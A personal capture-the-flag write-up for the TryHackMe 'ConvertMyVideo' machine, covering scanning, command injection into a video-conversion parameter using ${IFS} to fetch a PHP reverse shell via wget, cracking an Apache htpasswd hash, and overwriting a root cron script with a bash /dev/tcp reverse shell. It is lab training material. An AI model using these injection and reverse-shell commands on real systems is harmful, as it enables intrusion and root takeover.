---
date: 2024-10-23
title: ConvertMyVideo THM Write-Up
machine_ip: varies
os: Linux
difficulty: Medium
my_rating: 1
tags:
  - Linux
  - PrivEsc
  - pspy
  - rustscan
  - feroxbuster
  - whatweb
  - BurpeSuite
  - hydra
  - nc
  - hashcat
  - Apache
  - IFS
  - htapasswd
  - Cron
  - ps
references: "[[📚CTF Box Writeups]]"
---

# Enumeration


- Rustscan
```
┌──(root㉿kali)-[~/Transfer]
└─# rustscan -a 10.10.97.70 -t 2000 -b 2000 -- -A -sVC -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.97.70:22
Open 10.10.97.70:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sVC -Pn" on ip 10.10.97.70
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 14:13 PDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:13
Completed Parallel DNS resolution of 1 host. at 14:13, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:13
Scanning 10.10.97.70 [2 ports]
Discovered open port 80/tcp on 10.10.97.70
Discovered open port 22/tcp on 10.10.97.70
Completed SYN Stealth Scan at 14:13, 0.19s elapsed (2 total ports)
Initiating Service scan at 14:13
Scanning 2 services on 10.10.97.70
Completed Service scan at 14:13, 6.35s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.97.70
Retrying OS detection (try #2) against 10.10.97.70
Initiating Traceroute at 14:13
Completed Traceroute at 14:13, 3.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 14:13
Completed Parallel DNS resolution of 2 hosts. at 14:13, 0.04s elapsed
DNS resolution of 2 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.97.70.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:14, 4.94s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:14
Completed NSE at 14:14, 0.67s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:14
Completed NSE at 14:14, 0.00s elapsed
Nmap scan report for 10.10.97.70
Host is up, received user-set (0.17s latency).
Scanned at 2024-10-23 14:13:45 PDT for 20s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1FkWVdXpiZN4JOheh/PVSTjXUgnhMNTFvHNzlip8x6vsFTwIwtP0+5xlYGjtLorEAS0KpJLtpzFO4p4PvEzMC40SY8E+i4LaiXHcMsJrbhIozUjZssBnbfgYPiwCzMICKygDSfG83zCC/ZiXeJKWfVEvpCVX1g5Al16mzQQnB3qPyz8TmSQ+Kgy7GRc+nnPvPbAdh8meVGcSl9bzGuXoFFEAH5RS8D92JpWDRuTVqCXGxZ4t4WgboFPncvau07A3Kl8BoeE8kDa3DUbPYyn3gwJd55khaJSxkKKlAB/f98zXfQnU0RQbiAlC88jD2TmK8ovd2IGmtqbuenHcNT01D
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI3zR5EsH+zXjBa4GNOE8Vlf04UROD9GrpAgx0mRcrDQvUdmaF0hYse2KixpRS8Pu1qhWKVRP7nz0LX5nbzb4i4=
|   256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBKsS7+8A3OfoY8qtnKrVrjFss8LQhVeMqXeDnESa6Do
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=10/23%OT=22%CT=%CU=34987%PV=Y%DS=4%DC=T%G=N%TM=6719671D%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 21.142 days (since Wed Oct  2 10:49:16 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   42.76 ms  10.2.0.1
2   ... 3
4   175.02 ms 10.10.97.70

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:14
Completed NSE at 14:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:14
Completed NSE at 14:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:14
Completed NSE at 14:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds
           Raw packets sent: 61 (4.304KB) | Rcvd: 40 (3.064KB)
```
- #SSH and #Apache services are running on the machine

- Web enumeration
	- feroxbuster - directories/files
```
┌──(root㉿kali)-[~/Transfer]
└─# feroxbuster -r -k --url http://10.10.97.70       
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.97.70
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[>-------------------] - 1s         2/30000   3h      found:0       errors:0                                                                                404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
401      GET       14l       54w      458c http://10.10.97.70/admin
200      GET       14l       21w      205c http://10.10.97.70/style.css
200      GET       91l      489w    37474c http://10.10.97.70/images/youtube.png
200      GET       38l      309w    29089c http://10.10.97.70/images/mp3-file.png
200      GET        2l     1297w    89493c http://10.10.97.70/js/jquery-3.5.0.min.js
200      GET       22l       53w      755c http://10.10.97.70/js/main.js
200      GET       20l       52w      747c http://10.10.97.70/
[####################] - 5m    120010/120010  0s      found:7       errors:1325   
[####################] - 5m     30000/30000   105/s   http://10.10.97.70/ 
[####################] - 5m     30000/30000   107/s   http://10.10.97.70/js/ 
[####################] - 5m     30000/30000   105/s   http://10.10.97.70/tmp/ 
[####################] - 5m     30000/30000   107/s   http://10.10.97.70/images/ 
```
- `/admin` directory causes a popup for creds to be entered
- `/js/main.js` shows the main js code
- `/js/jquery-3.5.0.min.js` shows a larger code block

 - whatweb
```
┌──(root㉿kali)-[~/Transfer]
└─# whatweb http://10.10.97.70       
http://10.10.97.70 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.97.70], JQuery[3.5.0], Script[text/javascript]
```
- Webserver is running Apache 2.4.9

- Using #BurpeSuite we observe the admin page credentials I entered of `test:test` show up in the GET request as
	- `Authorization: Basic dGVzdDp0ZXN0`
	- when decoded,
```
┌──(root㉿kali)-[~/Transfer]
└─# echo "dGVzdDp0ZXN0" | base64 -d                                   
test:test  
```

- Using this [article](https://www.dailysecurity.net/2013/03/22/http-basic-authentication-dictionary-and-brute-force-attacks-with-burp-suite/) I attempt to crack the login for the admin directory using BurpSuite
	- Intruder Custom Iteration payload with usernames in payload 1 and passwords in payload 2, in separator box we add the `:` character, for Payload processing rule we add Base64-encode, lastly for Payload encoding, we remove the = symbol so it is not encoded. Start attack
		- slow but seems to be working 
		- not the way
- Looking more into http requests in Burp, when we try to convert a video named `test` to mp3 we see this 
	- `yt_url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dtest`
- the respond being,
```
{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: Incomplete YouTube ID test. URL https:\/\/www.youtube.com\/watch?v=test looks truncated.\n","url_orginal":"https:\/\/www.youtube.com\/watch?v=test","output":"","result_url":"\/tmp\/downloads\/67198b96f40e5.mp3"}
```
- telling us where mp3 files are saved, `/tmp/downloads/`
- After attempting to inject my reverse shell here, it kept getting restricted.
- Eventually, I did get a tip from community
	- they mentioned `{IFS}` this can be used to bypass restrictions if used instead of spaces. #IFS - Internal field separator, change " " for any other character
	- Lets move my `phprevsh.php` to the webserver with #SimpleHTTPServer on LHOST and #wget in `yt_url`
```
 yt_url=`wget${IFS}http://10.2.1.119/phprevsh.php`
```
- #nc listener up
```
rlwrap nc -lnvp 443
```
- and navigate to `http://10.10.97.70/phprevsh.php` from the browser
```
┌──(root㉿kali)-[~/Transfer]
└─# rlwrap nc -lnvp 443         
listening on [any] 443 ...
connect to [10.2.1.119] from (UNKNOWN) [10.10.97.70] 48368
Linux dmv 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:35:25 up  4:24,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
- We caught a shell as `www-data`!
- Now to pivot/escalate

---
# Foothold

- gain shell via exploit
- Stablize shell
	- `python3 -c 'import pty;pty.spawn("/bin/bash")'`  
## Pivot to user
- enumerate!
- Poking around we find we can read the `.htpasswd` file and the first flag
```
www-data@dmv:/var/www/html/admin$ cat .htpasswd
cat .htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```
- User flag - admin
```
www-data@dmv:/var/www/html/admin$ cat flag.txt
cat flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```
- The hash for `itsmeadmin` is `$apr1$` a quick search tells me it is Apache and is `-m 1600` for hashcat
- Let's crack it, first saved the hash password to a file called `hash` then use #hashcat 
```
┌──(root㉿kali)-[~]
└─# hashcat -m 1600 hash /usr/share/seclists/SecLists-master/Passwords/Cracked-Hashes/milw0rm-dictionary.txt                              
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 7800X3D 8-Core Processor, 14991/30047 MB (4096 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/SecLists-master/Passwords/Cracked-Hashes/milw0rm-dictionary.txt
* Passwords.: 84198
* Bytes.....: 675101
* Keyspace..: 84198

$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/:jessie              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
Time.Started.....: Wed Oct 23 18:43:51 2024 (2 secs)
Time.Estimated...: Wed Oct 23 18:43:53 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/SecLists-master/Passwords/Cracked-Hashes/milw0rm-dictionary.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    30948 H/s (11.90ms) @ Accel:512 Loops:125 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 52224/84198 (62.03%)
Rejected.........: 0/52224 (0.00%)
Restore.Point....: 49152/84198 (58.38%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
Candidate.Engine.: Device Generator
Candidates.#1....: jack1549 -> kidson
Hardware.Mon.#1..: Util: 84%

Started: Wed Oct 23 18:43:42 2024
Stopped: Wed Oct 23 18:43:54 2024
```

- The web admins credentials are `itsmeadmin:jessie`
- Let's use that to log into the website admin portal
- Looks like another BurpSuite situation. This page cleans downloads and sends an HTTP Get request `GET /admin/?c=rm%20-rf%20/var/www/html/tmp/downloads`


---
- Following walkthrough for the rest (timeline of taking exam requires me to go faster)
---
# Escalate
- `ps aux`
	- see `/usr/sbin/cron` running as root
-  now use #pspy, can analyze processes running, in this case, `cron` 
	- cd to `/var/www/html` and transfer `pspy64` to RHOST from LHOST
	- `chmod +x pspy64`
	- `./pspy64`
		- shows commands relating to processes!
		- Observe
```
2024/10/25 01:11:01 CMD: UID=0     PID=1412   | bash /var/www/html/tmp/clean.sh 
2024/10/25 01:11:01 CMD: UID=0     PID=1411   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh 
2024/10/25 01:11:01 CMD: UID=0     PID=1410   | /usr/sbin/CRON -f 
```
- `clean.sh` is a cron file overwrite
- Get shell again.
- cd `/var/www/html/tmp`, `chmod +rwx clean.sh`
- echo reverse shell into `clean.sh`
```
echo 'bash -i >& /dev/tcp/10.2.1.119/4242 0>&1' > clean.sh
```
- start nc listener on port 4242, and wait...
```
┌──(root㉿kali)-[~/Transfer]
└─# rlwrap nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.2.1.119] from (UNKNOWN) [10.10.140.86] 58036
bash: cannot set terminal process group (1472): Inappropriate ioctl for device
bash: no job control in this shell
root@dmv:/var/www/html/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```

- Since the cron job is run by root, we have a root shell!

- Root flag
```
root@dmv:/var/www/html/tmp# cat /root/root.txt
cat /root/root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```
